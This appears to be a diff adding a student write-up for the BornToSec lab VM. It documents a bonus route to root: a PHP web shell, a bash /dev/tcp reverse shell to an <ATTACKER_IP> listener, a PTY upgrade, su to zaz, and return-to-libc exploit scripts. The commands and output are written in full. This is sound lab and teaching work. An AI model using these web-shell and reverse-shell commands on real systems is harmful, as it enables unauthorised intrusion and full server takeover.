@@ -1,0 +1,130 @@
+# Bonus candidate 5 - Web-origin reverse shell ending in server root
+
+## Starting point and network
+
+This route starts at the forum/webmail credential discovery and phpMyAdmin
+access documented in [writeup1](../writeup1). On a fresh server, use its
+`SELECT ... INTO OUTFILE` step to create the PHP command endpoint; the
+endpoint was absent before I repeated that step on a fresh VM. Use the
+remaining shared steps to derive the `zaz` password. This document does
+not repeat those course credentials.
+
+Put Parrot and BornToSec on the same host-only network. The target is
+`192.168.56.101`; replace `<ATTACKER_IP>` with Parrot's address on that
+network. Test that callback before the defense.
+
+The reverse connection supplies an interactive transport. It starts as
+`www-data`; it becomes root only after the `zaz` transition and the
+return-to-libc step from [writeup1](../writeup1).
+
+## Confirm the web foothold
+
+After the phpMyAdmin write step, I queried the endpoint:
+
+```sh
+curl -ksS -G --data-urlencode 'cmd=id' 'https://192.168.56.101/forum/templates_c/shell.php'
+```
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+This proves server-side command execution, but UID 33 is not root. It also
+explains why a direct `id` response from the web page cannot finish the
+project.
+
+## Receive the reverse connection
+
+Start a listener on Parrot in one terminal, then trigger Bash through the
+PHP endpoint in another:
+
+```sh
+nc -lvnp 2226
+curl -ksS --max-time 30 -G \
+  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/2226 0>&1'" \
+  'https://192.168.56.101/forum/templates_c/shell.php'
+```
+
+The listener used `nc -lvnp 2226`. It showed:
+
+```text
+bash: no job control in this shell
+www-data@BornToSecHackMe:/var/www/forum/templates_c$ id -u
+33
+www-data@BornToSecHackMe:/var/www/forum/templates_c$ whoami
+www-data
+```
+
+The HTTP request remained open while the shell ran and eventually produced
+`curl: (28) Operation timed out`; the listener connection stayed usable.
+The callback, not the HTTP response, is the evidence. If it does not arrive
+on the school network, check Parrot's address, listener port, VM network,
+and firewall before proceeding.
+
+The [reverse-shell notes](../scripts/reverse_shell.md) include a PTY upgrade.
+I used it in the listener so `su` could prompt for a password:
+
+```sh
+python -c 'import pty;pty.spawn("/bin/bash")'
+su - zaz
+id -un
+```
+
+```text
+Password:
+zaz
+```
+
+Enter the `zaz` password derived in [writeup1](../writeup1). If terminal
+echo or line editing is broken, the notes' `Ctrl+Z`, `stty raw -echo`,
+`fg`, and `TERM` steps can improve the local terminal; they are terminal
+handling, not privilege escalation. A direct target-to-Parrot callback is
+the tested network model here.
+
+## Finish in a root shell on the reverse connection
+
+Copy the reviewed Python sources to `zaz` from a second Parrot terminal
+using the recovered account password:
+
+```sh
+scp scripts/exploit_me.py scripts/promote_root.py zaz@192.168.56.101:/home/zaz/
+```
+
+From the `zaz` prompt in the reverse connection, run the target-derived
+return-to-libc payload and promote the resulting effective-root shell:
+
+```sh
+python /home/zaz/exploit_me.py ret2libc
+python /home/zaz/promote_root.py
+id -u
+whoami
+id -ru
+id
+```
+
+I observed this on the listener that initially reported UID 33:
+
+```text
+# id -u
+0
+# whoami
+root
+# id -ru
+0
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+The root result is on the BornToSec server: `hostname` in the callback
+reported `BornToSecHackMe`. The `promote_root.py` source sets groups,
+GID, and UID to 0 before executing a new shell, so the final result does
+not depend on a database privilege or the PHP service identity.
+
+**Reproduction check:** create the web endpoint on the unmodified server;
+show its UID 33 identity; prove target-to-Parrot connectivity; obtain the
+reverse session; use a PTY and the documented `zaz` credential; run the
+reviewed source in normal setuid execution; show both UID-0 commands and
+`id -ru = 0` on the reverse connection. This route reuses writeup1's
+return-to-libc privilege escalation. The reverse connection is a different
+delivery and access path, but an evaluator may not award a separate bonus
+for it.
